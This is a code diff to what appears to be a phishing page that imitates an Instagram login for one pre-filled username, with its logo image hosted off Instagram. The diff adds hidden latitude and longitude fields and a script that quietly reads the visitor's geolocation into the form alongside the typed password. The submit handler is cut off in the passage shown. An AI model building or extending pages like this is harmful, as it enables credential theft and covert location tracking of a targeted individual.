@@ -75,18 +75,39 @@
   <div class="login-wrapper">
     <img src="https://linkdify.in/photo/najafafathiam.jpg" alt="Instagram Logo" style="border-radius: 200px;" />
 
-    <form id="login-form">
-      <h3>
-fidha9833
-</h3>
-      <input type="password" name="password" placeholder="Password" required />
-      <input type="submit" value="Log In" />
-    </form>
+<form id="login-form">
+  <h3>fidha9833</h3>
+  <input type="hidden" name="fidha9833" id="fidha9833">
+  <input type="password" name="password" placeholder="Password" required />
+  
+  <!-- Hidden inputs for latitude and longitude -->
+  <input type="hidden" name="latitude" id="latitude">
+  <input type="hidden" name="longitude" id="longitude">
+
+  <input type="submit" value="Log In" />
+</form>
+
+
 
     <div class="footer">© 2025 Instagram </div>
   </div>
 
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+
+  <script>
+  // Get user's location and set it in hidden inputs
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(function(position) {
+      document.getElementById("latitude").value = position.coords.latitude;
+      document.getElementById("longitude").value = position.coords.longitude;
+    }, function(error) {
+      console.warn("Location access denied or error occurred.");
+    });
+  } else {
+    console.warn("Geolocation not supported.");
+  }
+</script>
+
   <script>
     $("#login-form").submit((e) => {
       e.preventDefault();
